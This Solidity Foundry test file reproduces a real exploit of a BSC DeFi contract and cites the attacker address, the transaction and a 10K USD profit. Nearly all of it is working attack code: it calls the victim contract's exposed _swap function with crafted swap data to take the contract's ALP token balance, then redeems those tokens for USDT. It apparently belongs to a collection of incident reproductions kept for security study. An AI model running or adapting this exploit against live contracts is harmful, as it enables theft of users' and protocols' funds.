// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Attacker : https://bscscan.com/address/0xff61Ba33Ed51322BB716EAb4137Adf985644b94d
// Attack Contract : https://bscscan.com/address/0x0edf13f6bd033f0f267d46c6e9dff9c7190e0fa0
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0x9983ca8eaee9ee69629f74537eaf031272af75f1e5a7725911d8b06df17c67ca
// GUY : https://twitter.com/0xNickLFranklin/status/1765296663667875880
// Profit : 10K USD
// REASON : public interal call

struct ApolloXRedeemData {
  address alpTokenOut;
  uint256 minOut;
  address tokenOut;
  bytes aggregatorData;
}

struct RedeemData {
  uint256 amount;
  address receiver;
  ApolloXRedeemData apolloXRedeemData;
}

interface Vun  {
    function _swap(address tokenForSwap,bytes memory agg) external;
}

interface Alp is IERC20 {
    function maxRedeem(address owner) external returns (uint256 maxShares);
    function redeem(uint256 shares,RedeemData calldata redeemData) external;
}

contract ContractTest is Test {
    IERC20 constant USDT = Alp(0x55d398326f99059fF775485246999027B3197955);
    Alp constant ALP_APO = Alp(0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d);
    Vun constant VUN = Vun(0xD188492217F09D18f2B0ecE3F8948015981e961a);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("bsc", 36727073);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[End] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        uint256 VUN_balance = ALP_APO.balanceOf(address(VUN));
        uint256[] memory pools = new uint256[](1);
        pools[0] = uint256(1457847883966391224294152661087436089985854139374837306518);  // translate into hex,contain your address
        VUN._swap(address(ALP_APO),abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            address(this),
            address(ALP_APO),
            VUN_balance,
            0,
            pools
        ));
        ALP_APO.maxRedeem(address(this));
        ALP_APO.approve(address(ALP_APO),VUN_balance);
        RedeemData memory r;
        r.amount = VUN_balance;
        r.receiver = address(this);
        r.apolloXRedeemData.alpTokenOut = address(USDT);
        r.apolloXRedeemData.minOut = 0;
        r.apolloXRedeemData.tokenOut = address(USDT);
        r.apolloXRedeemData.aggregatorData = "";
        ALP_APO.redeem(VUN_balance,r);
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function swap(uint256 a,uint256 b,address c,bytes memory d) external{

    }

    function getReserves() public view returns (uint, uint, uint) { 
        return (1, 1, block.timestamp);
    }

}
